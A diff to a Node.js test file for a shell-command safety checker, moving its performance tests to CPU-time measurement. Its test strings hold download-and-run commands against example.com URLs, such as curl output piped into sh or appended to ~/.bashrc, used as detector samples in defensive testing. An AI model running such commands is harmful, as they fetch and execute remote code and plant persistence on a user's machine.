@@ -2,7 +2,7 @@
 
 process.env.ZN_STATS = 'off';
 
-// B-2214: literal variables assigned earlier on the same line (X=curl; $X URL | sh, S=sh; curl URL | $S, T=~/.bashrc; curl URL >> $T,
+// Literal variables assigned earlier on the same line (X=curl; $X URL | sh, S=sh; curl URL | $S, T=~/.bashrc; curl URL >> $T,
 // X="$(curl URL)"; sh -c "$X") are read by the download-and-run and startup-file download rules.
 // Only fake example.com URLs and example paths. Nothing is run: only the text is checked.
 
@@ -10,6 +10,7 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 
 const { checkCommand } = require('../lib/destructive');
+const { cpuNow, cpuMsSince } = require('./helpers/time_budget');
 
 const DL = 'https://example.com/i.sh';
 const RC = 'https://example.com/env.sh';
@@ -97,9 +98,9 @@ test('doubling a variable does not grow without bound', () => {
   let cmd = 'X=aaaaaaaaaaaaaaaa;';
   for (let i = 0; i < 400; i++) cmd += ' X=$X$X;';
   cmd += ` $X ${DL} | sh`;
-  const t0 = process.hrtime.bigint();
+  const t0 = cpuNow();
   const r = rule(cmd);
-  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+  const ms = cpuMsSince(t0);
   assert.ok(['allow', 'too_many_commands'].includes(r), r);
   assert.ok(ms < 2000, 'took ' + ms + ' ms');
 });
@@ -107,17 +108,17 @@ test('doubling a variable does not grow without bound', () => {
 test('200 KB inputs with variables stay linear', () => {
   for (const u of [`X=curl; $X ${DL} | sh; `, 'echo hi; ', `S=sh; curl ${DL} | $S; `]) {
     const big = u.repeat(Math.floor((200 * 1024 - 8) / u.length));
-    const t0 = process.hrtime.bigint();
+    const t0 = cpuNow();
     const r = rule(big);
-    const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+    const ms = cpuMsSince(t0);
     assert.ok(ms < 3000, JSON.stringify(u) + ' took ' + ms + ' ms (' + r + ')');
   }
   const lines = Array.from({ length: 12000 }, (_, i) => `W${i % 200}=v`).join('\n') + `\nX=curl\n$X ${DL} | sh`;
-  const t1 = process.hrtime.bigint();
+  const t1 = cpuNow();
   rule(lines);
-  assert.ok(Number(process.hrtime.bigint() - t1) / 1e6 < 3000);
+  assert.ok(cpuMsSince(t1) < 3000);
   const refs = 'X=a; echo ' + '$X'.repeat(90000);
-  const t2 = process.hrtime.bigint();
+  const t2 = cpuNow();
   rule(refs);
-  assert.ok(Number(process.hrtime.bigint() - t2) / 1e6 < 3000);
+  assert.ok(cpuMsSince(t2) < 3000);
 });
